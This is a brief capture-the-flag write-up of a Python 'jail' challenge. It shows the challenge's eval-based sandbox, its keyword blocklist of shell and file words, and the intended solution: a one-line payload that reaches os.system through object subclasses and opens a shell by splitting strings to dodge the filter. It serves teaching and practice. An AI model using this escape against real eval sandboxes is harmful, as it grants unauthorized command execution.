# prison

other quasar collabs with super penguin 612

## challenge

Eth007.py
```
def main():
    try:
        caught = False
        cmd = input("> ")
        for x in cmd:
            if not(33<=ord(x) and ord(x)<=126) or ord(x)==43:
                caught = True
        with open("ContrabandWords.txt","r") as c:
            Contrabands = c.readlines()
        for Contraband in Contrabands:
            if Contraband.rstrip("\n") in cmd.lower():
                caught = True
        if (caught==False):
            try:
                print(eval(cmd,{"__builtins__": None}))
            except:
                pass
        else:
            print("And you were caught...")
        Continue = input("Try again [y/n]: ")
        if Continue == "y":
            main()
        else:
            print("Bye")
    except:
        print("Huh you broke my code")
        main()
print("Welcome to your jail cell")
main()
```

ContrabandWords.txt
```
cat
grep
nano
input
sys
os
int
print
open
read
write
while
echo
execfile
file
dir
dict
import
+
join
f"
{
flag
%
;
Popen
call
eval
run
exec
```

## intended solution

`().__class__.__base__.__subclasses__()[-4].__init__.__globals__["sy""stem"]("s""h")`

the idea here is that the strings can be concat'd by simply putting them next to each other.

alternatively, you could just use `__add__` though...
